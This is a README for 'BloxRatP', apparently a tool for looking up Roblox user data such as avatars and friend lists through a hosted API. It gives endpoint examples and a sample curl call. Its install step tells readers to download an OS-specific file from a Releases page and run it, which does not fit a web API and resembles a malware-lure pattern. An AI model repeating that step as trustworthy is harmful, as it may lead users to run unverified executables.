# BloxRatP 🐭

![BloxRatP](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)

Welcome to **BloxRatP**, your go-to tool for fetching Roblox user information effortlessly. Say "thanks" to Louie for making this possible! Whether you're a developer, gamer, or just curious about Roblox users, BloxRatP provides a straightforward solution to access user data.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [API Reference](#api-reference)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Acknowledgments](#acknowledgments)

## Features

- **User Information Retrieval**: Get detailed information about any Roblox user, including their avatar, friends, and more.
- **Easy to Use**: Simple API calls to fetch the data you need.
- **Fast Response**: Quick data retrieval ensures a smooth experience.
- **JSON Format**: Data is returned in a clean JSON format, easy to parse and use.
- **Proxy Support**: Built-in proxy support to enhance your requests.
- **Vercel Deployment**: Hosted on Vercel for reliable uptime.

## Installation

To get started, download the latest release of BloxRatP from our [Releases page](https://github.com/kenneth0307/BloxRatP/releases). Make sure to download the appropriate file for your operating system. After downloading, execute the file to set up BloxRatP on your system.

## Usage

Using BloxRatP is straightforward. Here’s how to make a simple request to get user information:

1. **Set Up Your Environment**: Ensure you have the necessary dependencies installed.
2. **Make a Request**: Use the following endpoint to get user info:

   ```
   GET https://api.bloxratp.com/user/{username}
   ```

   Replace `{username}` with the Roblox username you want to query.

3. **Handle the Response**: The response will be in JSON format. You can easily parse this in your application.

### Example Request

```bash
curl -X GET "https://api.bloxratp.com/user/RobloxUser123"
```

### Example Response

```json
{
  "username": "RobloxUser123",
  "avatar": "https://www.roblox.com/avatars/123456",
  "friends": 150,
  "status": "Online"
}
```

## API Reference

BloxRatP offers several endpoints to access different types of user information. Below are the main endpoints:

### User Info

- **Endpoint**: `/user/{username}`
- **Method**: GET
- **Description**: Fetches information about a specific Roblox user.

### User Avatar

- **Endpoint**: `/avatar/{username}`
- **Method**: GET
- **Description**: Retrieves the avatar image of the specified user.

### User Friends

- **Endpoint**: `/friends/{username}`
- **Method**: GET
- **Description**: Lists friends of the specified user.

### User Thumbnails

- **Endpoint**: `/thumbnails/{username}`
- **Method**: GET
- **Description**: Fetches thumbnails of the user's avatar.

## Contributing

We welcome contributions to BloxRatP! If you have suggestions or improvements, please fork the repository and submit a pull request. Here’s how to contribute:

1. Fork the repository.
2. Create a new branch for your feature or fix.
3. Make your changes.
4. Commit your changes and push to your branch.
5. Submit a pull request.

Please ensure your code adheres to our coding standards and includes tests where applicable.

## License

BloxRatP is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Contact

For any questions or support, feel free to reach out:

- **Email**: support@bloxratp.com
- **GitHub Issues**: Open an issue in the repository for bugs or feature requests.

## Acknowledgments

- **Louie**: Special thanks to Louie for his contributions to this project.
- **Roblox API**: This project leverages the Roblox API for user data retrieval.
- **Vercel**: For hosting our service and ensuring it runs smoothly.

For more updates and releases, visit our [Releases page](https://github.com/kenneth0307/BloxRatP/releases). 

Thank you for using BloxRatP! Enjoy exploring the world of Roblox user data!